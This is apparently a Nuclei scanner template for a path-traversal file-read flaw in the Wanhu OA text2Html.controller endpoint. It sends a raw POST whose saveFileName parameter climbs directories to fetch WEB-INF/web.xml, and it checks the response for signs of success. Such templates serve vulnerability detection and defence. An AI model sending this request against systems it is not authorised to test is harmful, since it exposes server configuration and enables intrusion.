id: wanhu-text2Html-fileread

info:
  name: wanhu-text2Html-fileread
  author: wanhu-text2Html-fileread
  severity: high


http:
  - raw:
      - |              
        POST /defaultroot/convertFile/text2Html.controller HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

        saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html
      
     
    matchers:
      - type: dsl
        condition: or
        dsl:
          - "contains_all(body,'web-app','filter-name') && status_code==200"
          - "contains_all(body,'文件不存在') && status_code==200"
